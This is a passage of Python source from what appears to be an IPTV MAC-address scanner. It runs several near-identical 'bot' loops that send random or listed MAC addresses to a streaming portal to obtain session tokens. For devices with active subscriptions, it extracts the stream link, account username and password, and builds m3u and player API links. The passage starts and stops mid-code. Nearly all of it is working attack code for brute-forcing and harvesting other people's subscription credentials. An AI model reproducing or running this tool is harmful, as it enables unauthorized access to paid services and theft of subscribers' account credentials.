				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d3():
	global hitc
	global hitr
	global tokenr
	for mac in range(3,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_03"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)


def d4():
	global hitc
	global hitr
	global tokenr
	for mac in range(4,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_04"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d5():
	global hitc
	global hitr
	global tokenr
	for mac in range(5,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_05"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d6():
	global hitc
	global hitr
	global tokenr
	for mac in range(6,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_06"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d7():
	global hitc
	global hitr
	global tokenr
	for mac in range(7,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_07"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d8():
	global hitc
	global hitr
	global tokenr
	for mac in range(8,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_08"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)

def d9():
	global hitc
	global hitr
	global tokenr
	for mac in range(9,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_09"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
